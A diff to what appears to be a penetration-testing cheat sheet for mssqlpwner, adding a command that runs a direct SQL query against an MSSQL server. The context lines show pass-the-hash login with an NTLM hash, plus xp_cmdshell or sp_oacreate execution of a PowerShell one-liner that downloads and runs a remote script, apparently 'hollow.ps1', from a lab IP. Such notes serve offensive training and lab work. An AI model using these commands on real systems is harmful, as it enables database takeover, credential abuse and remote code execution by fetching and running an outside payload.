@@ -195,6 +195,9 @@ Enumerate MSSQL instance:
 Get interactive prompt:
 - `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth interactive`
 
+Execute direct query:
+- `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"`
+
 Execute xp_cmdshell (automation is done by the tool, it will try every variation to get it done):
 - `exec -command_execution_method (xp_cmdshell/sp_oacreate) "powershell iex(iwr http://192.168.45.196/hollow.ps1 -useb)"`
 
